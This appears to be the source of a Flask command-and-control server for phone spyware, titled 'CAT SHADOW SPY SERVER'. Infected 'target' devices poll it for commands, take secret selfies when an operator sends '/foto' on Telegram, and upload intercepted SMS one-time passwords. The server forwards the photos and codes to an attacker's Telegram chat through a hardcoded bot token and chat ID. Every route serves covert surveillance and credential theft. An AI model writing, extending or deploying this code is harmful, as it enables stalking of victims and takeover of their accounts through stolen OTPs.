from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
import threading

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8582172510:AAFkJLO1i6ndtWG3mDPTfY4q0TEH59yWw_I"
CHAT_ID = "7228378199"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

devices = {}
os.makedirs("received_photos", exist_ok=True)


@app.route('/command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')
    if device_id not in devices:
        devices[device_id] = {"command": "idle"}
        print(f"📱 New device connected: {device_id}")
    return jsonify({"command": devices[device_id].get("command", "idle")})


@app.route('/upload', methods=['POST'])
def upload_photo():
    print("📥 Upload request received")
    print(f"📋 Headers: {dict(request.headers)}")
    print(f"📋 Form data: {dict(request.form)}")
    print(f"📋 Files: {list(request.files.keys())}")

    file = request.files.get('photo')
    device_id = request.form.get('device_id')

    if not file:
        print("❌ No 'photo' field in request")
        return jsonify({"error": "no photo field"}), 400

    if not device_id:
        print("❌ No 'device_id' field in request")
        return jsonify({"error": "no device_id"}), 400

    print(f"📸 Received photo from {device_id}")
    print(f"📄 Filename: {file.filename}")
    print(f"📦 Content-Type: {file.content_type}")

    # Baca ukuran file
    file.seek(0, os.SEEK_END)
    file_size = file.tell()
    file.seek(0)
    print(f"📏 File size: {file_size} bytes")

    filename = f"selfie_{device_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    filepath = os.path.join("received_photos", filename)
    file.save(filepath)
    print(f"💾 Photo saved: {filepath}")

    send_photo_to_telegram(filepath, device_id)

    return jsonify({"status": "ok", "filename": filename})


@app.route('/otp', methods=['POST'])
def receive_otp():
    data = request.json
    otp = data.get('otp')
    pengirim = data.get('pengirim')
    device_id = data.get('device_id')

    print(f"🔐 OTP received: {otp} from {pengirim} (device: {device_id})")

    message = f"🔐 *OTP DETECTED!*\n\n📱 From: {pengirim}\n🔑 OTP: `{otp}`\n🆔 Device: {device_id}"

    try:
        requests.post(
            f"{TELEGRAM_URL}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "Markdown"
            }
        )
        print(f"✅ OTP forwarded to Telegram")
    except Exception as e:
        print(f"❌ Failed to forward OTP: {e}")

    return jsonify({"status": "ok"})


def send_photo_to_telegram(filepath, device_id):
    url = f"{TELEGRAM_URL}/sendPhoto"
    try:
        with open(filepath, 'rb') as f:
            files = {'photo': f}
            data = {
                'chat_id': CHAT_ID,
                'caption': f"📸 Selfie dari device `{device_id}`",
                'parse_mode': 'Markdown'
            }
            response = requests.post(url, files=files, data=data)
            print(f"📤 Telegram response: {response.status_code}")

            if response.status_code != 200:
                print(f"❌ Telegram error: {response.text}")

    except Exception as e:
        print(f"❌ Failed to send photo to Telegram: {e}")


@app.route('/telegram_webhook', methods=['POST'])
def telegram_webhook():
    data = request.json
    message = data.get('message', {})
    text = message.get('text', '')
    chat_id = message.get('chat', {}).get('id')

    print(f"📩 Pesan dari Telegram: {text}")

    if text and text.startswith('/foto'):
        if not devices:
            requests.post(f"{TELEGRAM_URL}/sendMessage", json={
                "chat_id": chat_id,
                "text": "❌ Belum ada target yang terhubung."
            })
            return jsonify({"status": "ok"})

        for device_id in devices.keys():
            devices[device_id]["command"] = "take_photo"
            print(f"📸 Command 'take_photo' sent to {device_id}")

        requests.post(f"{TELEGRAM_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": f"📸 Perintah foto dikirim ke {len(devices)} target!"
        })

    return jsonify({"status": "ok"})


@app.route('/devices', methods=['GET'])
def list_devices():
    return jsonify({
        "devices": list(devices.keys()),
        "total": len(devices)
    })


@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({
        "status": "alive",
        "timestamp": datetime.now().isoformat(),
        "devices_connected": len(devices)
    })


if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║   🐱 CAT SHADOW SPY SERVER              ║
    ║   Running on: http://0.0.0.0:5000       ║
    ╚══════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=True)
